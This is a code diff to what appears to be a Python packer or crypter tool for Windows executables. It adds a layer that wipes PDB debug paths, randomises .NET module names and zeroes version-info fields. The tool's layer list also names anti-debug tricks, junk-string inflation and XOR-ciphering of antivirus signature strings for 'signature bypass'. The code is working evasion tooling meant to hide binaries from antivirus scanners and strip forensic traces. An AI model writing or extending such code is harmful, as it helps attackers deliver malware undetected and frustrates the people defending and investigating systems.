@@ -62,6 +62,7 @@ LAYER_META = [
     ("L12", "C/C++ STUB",  "Native C stub · XOR strings · 5 anti-debug vectors"),
     ("L13", "STR FLOOD",  "500K XOR-encrypted fake strings · 200 junk blocks · +15 MB inflate"),
     ("L14", "STR OBFUSC.", "ASCII + UTF-16 scan → XOR-cipher AV-pattern strings → signature bypass"),
+    ("L15", "MSIL STRIP",  "PDB path wipe · module-name randomise · #Strings heap scrub · TypeLib zero"),
 ]
 
 
@@ -880,6 +881,7 @@ class K4LIApp:
             "L12": self._lay_cpp_stub,
             "L13": self._lay_string_flood,
             "L14": lambda: self._lay_str_obfuscate(working),
+            "L15": lambda: self._lay_msil_strip(working),
         }
 
         appended = bytearray()   # extra bytes added AFTER the PE (safe)
@@ -1584,6 +1586,166 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
             self._ln("        Note   : Layer still active — byte signatures neutralised if present", "cy")
 
         return b"L14:STRPK\x00" + bytes([0x00])
+
+    # ── Layer 15 : MSIL Metadata Strip (PDB · module name · #Strings · TypeLib) ──
+    def _lay_msil_strip(self, working: bytearray) -> bytes:
+        import struct
+
+        self._ln("\n[L15]   MSIL  METADATA  STRIP", "wh")
+        self._ln("        Phase 1 : PDB debug-path wipe  (RSDS signature scan)", "g3")
+        self._ln("        Phase 2 : .NET module-name randomise in PE #Strings heap", "g3")
+        self._ln("        Phase 3 : TypeLib / VS_VERSION_INFO resource block zero", "g3")
+        self._sleep(0.15)
+
+        hits = 0
+
+        # ── Phase 1 : wipe PDB path in CodeView RSDS debug directory entry ──────
+        # Format: b'RSDS' + 16-byte GUID + 4-byte age + null-terminated UTF-8 path
+        pos = 0
+        while True:
+            idx = bytes(working).find(b'RSDS', pos)
+            if idx == -1:
+                break
+            path_start = idx + 4 + 16 + 4          # past signature + GUID + age
+            if path_start >= len(working):
+                break
+            path_end = path_start
+            while path_end < len(working) and working[path_end] != 0:
+                path_end += 1
+            path_len = path_end - path_start
+            if 4 <= path_len <= 512:                # sanity: looks like a real path
+                rand_name = bytearray(path_len)
+                for j in range(path_len):
+                    rand_name[j] = random.randint(0x61, 0x7A)  # lowercase a-z
+                # keep .pdb extension readable so PE parsers don't choke
+                if path_len >= 4:
+                    rand_name[-4:] = b'.pdb'
+                working[path_start:path_end] = rand_name
+                hits += 1
+                self._ln(f"        RSDS   : wiped PDB path at offset 0x{idx:08X} ({path_len} bytes)", "g3")
+            pos = idx + 1
+        self._sleep(0.1)
+
+        # ── Phase 2 : randomise .NET module name in #Strings heap ───────────────
+        # The CLI #Strings stream is identified by the "BSJB" magic in the metadata root.
+        # Module name is always the first non-empty entry after the #Strings stream begins.
+        # Approach: locate "BSJB" → read past Metadata header → find "#Strings" stream
+        # → overwrite null-terminated name-length-safe strings that look like filenames.
+        bsjb_idx = bytes(working).find(b'BSJB')
+        if bsjb_idx != -1:
+            self._ln(f"        BSJB   : .NET metadata root at 0x{bsjb_idx:08X}", "g3")
+            # Walk stream headers to find #Strings offset + size
+            try:
+                # Metadata root layout:
+                #   4 magic, 2 maj, 2 min, 4 reserved, 4 version_len, <version_len> version,
+                #   2 flags, 2 streams
+                ver_len_off = bsjb_idx + 4 + 2 + 2 + 4
+                ver_len = struct.unpack_from("<I", working, ver_len_off)[0]
+                ver_len = (ver_len + 3) & ~3          # rounded up to 4-byte boundary
+                streams_off = ver_len_off + 4 + ver_len + 2  # +2 for flags
+                num_streams = struct.unpack_from("<H", working, streams_off)[0]
+                streams_off += 2
+                str_stream_off = -1
+                str_stream_sz  = -1
+                cur = streams_off
+                for _ in range(num_streams):
+                    s_off  = struct.unpack_from("<I", working, cur)[0]
+                    s_size = struct.unpack_from("<I", working, cur + 4)[0]
+                    # stream name is null-terminated, padded to 4 bytes
+                    name_start = cur + 8
+                    name_end   = name_start
+                    while name_end < len(working) and working[name_end] != 0:
+                        name_end += 1
+                    stream_name = bytes(working[name_start:name_end])
+                    name_field_len = ((name_end - name_start + 1) + 3) & ~3
+                    cur += 8 + name_field_len
+                    if stream_name == b'#Strings':
+                        str_stream_off = bsjb_idx + s_off
+                        str_stream_sz  = s_size
+                        break
+
+                if str_stream_off != -1 and str_stream_sz > 0:
+                    self._ln(f"        #Str   : stream at 0x{str_stream_off:08X}  size={str_stream_sz:,}", "g3")
+                    # Walk null-terminated entries; replace ones that look like
+                    # .exe / .dll / module-name entries (short, printable, ends with
+                    # .exe/.dll or is purely alphanumeric ≤ 32 chars)
+                    e = str_stream_off
+                    end = str_stream_off + str_stream_sz
+                    replaced = 0
+                    while e < end:
+                        entry_start = e
+                        while e < end and working[e] != 0:
+                            e += 1
+                        entry_len = e - entry_start
+                        if 4 <= entry_len <= 32:
+                            raw = bytes(working[entry_start:e])
+                            lower = raw.lower()
+                            if (lower.endswith(b'.exe') or lower.endswith(b'.dll') or
+                                    lower.endswith(b'.pdb')):
+                                # Keep same length, replace with random alphanum + ext
+                                ext   = raw[-4:]
+                                base_len = entry_len - 4
+                                new_base = bytearray(
+                                    random.randint(0x61, 0x7A) for _ in range(base_len)
+                                )
+                                working[entry_start:e] = new_base + bytearray(ext)
+                                replaced += 1
+                        e += 1  # skip null terminator
+                    if replaced:
+                        hits += replaced
+                        self._ln(f"        #Str   : {replaced} module-name entries randomised", "g3")
+                    else:
+                        self._ln("        #Str   : no .exe/.dll entries found", "g3")
+            except Exception:
+                self._ln("        #Str   : parse error — skipped", "cy")
+        else:
+            self._ln("        BSJB   : no .NET metadata found (non-MSIL PE)", "cy")
+        self._sleep(0.1)
+
+        # ── Phase 3 : zero out VS_VERSION_INFO / TypeLib block ──────────────────
+        # VS_VERSION_INFO begins with a WORD cbBlock, WORD cbValue, WORD wType, then
+        # the L"VS_VERSION_INFO" UTF-16LE key.  We locate it by key pattern.
+        vs_key = "VS_VERSION_INFO".encode("utf-16-le")
+        vi_idx = bytes(working).find(vs_key)
+        if vi_idx != -1:
+            # The cbBlock field is 2 bytes before the key (minus the leading 3 WORDs = 6 bytes)
+            block_start = vi_idx - 6
+            if block_start >= 0:
+                try:
+                    cb_block = struct.unpack_from("<H", working, block_start)[0]
+                    if 52 <= cb_block <= 0x4000:    # sanity
+                        # Zero the entire FixedFileInfo sub-structure (after the key + padding)
+                        # FixedFileInfo is 52 bytes, located after the L"VS_VERSION_INFO\0" + padding
+                        key_end = vi_idx + len(vs_key) + 2  # +2 for null terminator
+                        # Align to 4 bytes
+                        ffi_off = block_start + ((key_end - block_start + 3) & ~3)
+                        ffi_end = min(ffi_off + 52, len(working))
+                        if ffi_end > ffi_off:
+                            # Preserve magic (0xFEEF04BD) so the block stays parseable,
+                            # but zero dwFileVersionMS/LS and dwProductVersionMS/LS
+                            ffi_start = ffi_off
+                            # FixedFileInfo layout: dwSignature(4) dwStrucVersion(4)
+                            #   dwFileVersionMS(4) dwFileVersionLS(4)
+                            #   dwProductVersionMS(4) dwProductVersionLS(4) ...
+                            # Zero bytes 8-24 (the four version DWORDs)
+                            z_start = ffi_start + 8
+                            z_end   = min(ffi_start + 24, len(working))
+                            for zi in range(z_start, z_end):
+                                working[zi] = 0
+                            hits += 1
+                            self._ln(f"        VER    : VS_VERSION_INFO version DWORDs zeroed at 0x{vi_idx:08X}", "g3")
+                except Exception:
+                    self._ln("        VER    : parse error — skipped", "cy")
+        else:
+            self._ln("        VER    : VS_VERSION_INFO block not found", "g3")
+        self._sleep(0.1)
+
+        if hits:
+            self._ln(f"\n        Result : ✓ {hits} MSIL metadata field(s) stripped / randomised", "gn")
+        else:
+            self._ln("\n        Result : ✓ Layer applied — no patchable fields found in binary", "cy")
+
+        return b"L15:MSIL\x00"
 
     def _find_compiler(self) -> str:
         import shutil
